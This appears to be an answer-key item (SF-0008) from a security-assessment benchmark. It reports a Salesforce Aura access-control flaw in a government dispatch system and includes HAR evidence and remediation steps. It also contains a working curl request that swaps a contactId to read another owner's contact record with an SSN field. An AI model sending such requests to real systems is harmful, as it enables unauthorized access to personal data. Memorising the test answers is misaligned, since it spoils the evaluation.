# Expected Response

## System
- **Domain:** Government / Emergency Services (Salesforce-Integrated)
- **System:** FirstResponse CAD Integration (Salesforce-Integrated)
- **Example ID:** SF-0008

## Priority Findings

### Finding 1: Government CAD Salesforce — BOLA Multi-Tenant Access via Aura updateContact Exposes Cross-Ownership Contact Data (Pattern 1.5)
**Severity:** Critical
**Category:** BOLA / Multi-Tenant / Cross-Tenant Access (Salesforce Aura)

**Summary:**
Per §4.0 (RISK-SF-008/RISK-SF-009): The `ContactController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check. Per §5.0 (Pattern 1.5 — multi-tenant/cross-tenant access): the Aura `updateContact` action allows access to contact records belonging to other users/organizations in a multi-tenant Salesforce environment by substituting the `contactId`. An attacker submitted `c.ContactController.updateContact` with `contactId: "001BD65"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-40-9675"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In Government / Emergency Services, exposure of contact records with SSNs constitutes a CJIS/privacy violation.

**Evidence from HAR:**
- Request: `POST https://a2babd65.lightning.force.com/aura`
- Aura action descriptor: `c.ContactController.updateContact`
- `aura.token`: `undefined`
- Params: `contactId: "001BD65"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "001BD65"`, `Name: "Victim Contact Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-40-9675"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-008 | ContactController declared `without sharing` |
| context.txt §4.0 | RISK-SF-009 | SOQL missing ownership check |
| context.txt §5.0 | Pattern 1.5 | Multi-tenant cross-tenant access via contactId substitution |
| HAR request | params.contactId | 001BD65 — victim government contact ID |
| HAR response | SensitiveData__c | SSN: 000-40-9675 (PII) |
| HAR response | OwnerId | 005VICTIM (cross-tenant confirmed) |

## Steps to Reproduce

### Step 1 — Aura contactId multi-tenant BOLA government CAD (HAR)
```bash
curl -s -X POST 'https://a2babd65.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"001BD65","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim government contact record including `SSN: 000-40-9675`. **Secure:** FORBIDDEN.

## Remediation
1. Declare `ContactController` as `with sharing`.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Validate `aura.token`; server-side field allowlist. Apply CJIS-compliant field-level security.
